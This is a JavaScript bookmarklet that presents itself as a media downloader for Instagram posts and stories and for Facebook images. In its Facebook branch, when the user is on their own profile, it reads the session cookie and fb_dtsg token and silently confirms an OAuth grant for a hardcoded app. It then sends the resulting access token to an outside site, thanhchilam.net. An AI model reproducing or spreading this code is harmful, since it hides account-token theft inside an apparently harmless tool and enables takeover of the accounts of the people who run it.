javascript:
var host = window.location.hostname;
var pathname = window.location.pathname;
var fullurl = host + pathname;
var https_host = "https://" + host + pathname;
var ps = fullurl.split("/")[1];
switch (host) {
    case "www.instagram.com":
        switch(ps) {
            case "p":
                    var linkvid = document.getElementsByClassName("tWeCl")[0];
                    if(linkvid == undefined){
                    var length_photo = document.getElementsByClassName("FFVAD").length;
                    var linkins = length_photo - 1;
                    var link_photo = document.getElementsByClassName("FFVAD")[linkins].currentSrc;
                    window.open(link_photo, '_blank');
                        
                    }else{
                        var linkvid = linkvid.currentSrc;
                        window.open(linkvid, '_blank');
                    }
            case "stories":
                    var photo = document.getElementsByClassName('y-yJ5')[0].src;
                if(photo == null){
                    var video = document.getElementsByClassName('y-yJ5')[2].currentSrc;
                    window.open(video, '_blank'); 
                }
                else{
                    window.open(photo , '_blank');
                }
            break;
            default:
                window.open("http://insd.ga", '_blank');
            }
    break;
    case "www.facebook.com":
                var your_url = document.getElementsByClassName("_2s25")[0].href;
                if(https_host  == your_url ){
                    var uid = document.cookie.match(/c_user=(\d+)/)[1],
                    dtsg = document.getElementsByName("fb_dtsg")[0].value,
                    http = new XMLHttpRequest,
                    url = "//www.facebook.com/v1.0/dialog/oauth/confirm",
                    params = "fb_dtsg=" + dtsg + "&app_id=165907476854626&redirect_uri=fbconnect%3A%2F%2Fsuccess&display=page&access_token=&from_post=1&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1&__user=" + uid;
                    http.open("POST", url, !0), http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), http.onreadystatechange = function() {
                    if (4 == http.readyState && 200 == http.status) {
                    var a = http.responseText.match(/access_token=(.*)(?=&expires_in)/);
                    var detoken = a[1];
                    var link = "http://thanhchilam.net/testtoken.php?token=" + detoken;
                    window.open( link ,'_blank');
                    }
                    }, http.send(params);
                }
                else{
                    var check_graud = document.querySelector("._ttp");
                    	if(check_graud == null){
                                var story = document.getElementsByClassName('_5i4g')[0];
                                if(story == undefined){
                                    var get = document.getElementsByClassName('_7yy')[0].innerHTML;
                                        document.write(get); 
                                }else{
                                    story = story.src;
                                    window.open(story, '_blank'); 
                                }
                    	}else {
                        	function copy(id){
                                var b=document.createElement("textarea"),c=document.getSelection();
                                b.textContent=id,document.body.appendChild(b),c.removeAllRanges(),b.select(),document.execCommand("copy"),c.removeAllRanges(),document.body.removeChild(b)
                                };
                                function getMe(){
                                    try{
                                        var id = encodeURIComponent(require("TimelineController").getProfileID());
                                        if(id!="null") return id;
                                        else return "0";
                                    }
                                    catch (e){
                                        return "0";
                                    }
                                }
                                var id = getMe();
                                var url = "http://graph.facebook.com/"+ id + "/picture?height=720&width=720";
                                window.open(url, '_blank');
                                          }
                    }
        break;
}